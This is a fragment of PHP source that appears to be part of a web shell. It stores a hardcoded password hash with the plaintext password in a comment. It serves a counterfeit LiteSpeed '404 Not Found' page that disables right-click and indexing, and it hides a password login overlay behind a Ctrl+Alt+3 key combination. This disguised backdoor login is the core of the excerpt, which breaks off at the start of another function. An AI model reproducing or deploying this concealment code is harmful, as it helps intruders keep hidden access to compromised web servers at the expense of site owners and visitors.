...
$GLOBALS['PASSHASH'] = '9252db9f5049741fb72ee1085aacbb0798c9c7ba22c5cd982f9bdd3e6e098261d34384af3773ac46daf221c32a02a73d075038ef5c46a6c06c74ee3de59045a0';//P@55w()rD
...
function loginFormOut(){ $html=' <!DOCTYPE html> <html lang="en" style="height:100%;"> <head> <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"> <meta name="robots" content="noindex,nofollow"> <title>404 Not Found</title> <style> @media(prefers-color-scheme:dark) { body { background:#000 !important } } </style> </head> <body oncontextmenu="return false" style="color:#444;margin:0;font:normal 14px/20px Arial,Helvetica,sans-serif;height:100%;background:#fff;"> <div style="height:auto;min-height:100%;"> <div style="text-align:center;width:800px;margin-left:-400px;position:absolute;top:30%;left:50%;"> <h1 style="margin:0;font-size:150px;line-height:150px;font-weight:bold;">404</h1> <h2 style="margin-top:20px;font-size:30px;">Not Found</h2> <?php if($message): ?> <p class="error-message"><?php echo htmlspecialchars($message); ?></p> <?php endif; ?> <p>The resource requested could not be found on this server!</p> </div> </div> <div style="color:#f0f0f0;font-size:12px;margin:auto;padding:0 30px;height:100px;margin-top:-101px;background:#474747;border-top:1px solid rgba(0,0,0,0.15);box-shadow:0 1px 0 rgba(255,255,255,0.3) inset;"> <br>Proudly powered by LiteSpeed Web Server <p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and has no control over site content.</p> </div> <script> (function(){ function showOverlay(){ if(document.getElementById("pf-overlay")) return; var overlay=document.createElement("div"); overlay.id="pf-overlay"; overlay.style.position="fixed"; overlay.style.inset="0"; overlay.style.display="flex"; overlay.style.alignItems="center"; overlay.style.justifyContent="center"; overlay.style.background="rgba(0,0,0,0.6)"; overlay.style.zIndex="999999"; var box=document.createElement("div"); box.style.background="#f0f0f0"; box.style.padding="24px"; box.style.borderRadius="8px"; box.style.boxShadow="0 6px 20px rgba(0,0,0,0.45)"; box.style.minWidth="260px"; box.style.textAlign="center"; var form=document.createElement("form"); form.method="POST"; form.onsubmit=function(){ return true; }; var input=document.createElement("input"); input.type="password"; input.name="pass"; input.placeholder="Enter password"; input.style.width="100%"; input.style.padding="10px"; input.style.fontSize="16px"; input.style.borderRadius="4px"; input.style.border="1px solid #ccc"; input.autocomplete="off"; var submit=document.createElement("input"); submit.type="submit"; submit.value="Login"; submit.style.width="100%"; submit.style.marginTop="8px"; submit.style.padding="10px"; submit.style.borderRadius="4px"; submit.style.cursor="pointer"; form.appendChild(input); form.appendChild(submit); box.appendChild(form); overlay.appendChild(box); document.body.appendChild(overlay); input.focus(); } document.addEventListener("keydown",function(e){ var isDigit3 = (e.code==="Digit3") || (e.key==="3") || (e.keyCode===51); var altGraph = (e.getModifierState && e.getModifierState("AltGraph")); if((e.ctrlKey && e.altKey && isDigit3) || (altGraph && isDigit3)){ e.preventDefault(); showOverlay(); return; } },true); document.addEventListener("contextmenu",function(e){ e.preventDefault(); }); })(); </script> </body> </html>'; exit(makeOut($html . paramsHandlerJS())); }
function scriptInit(){
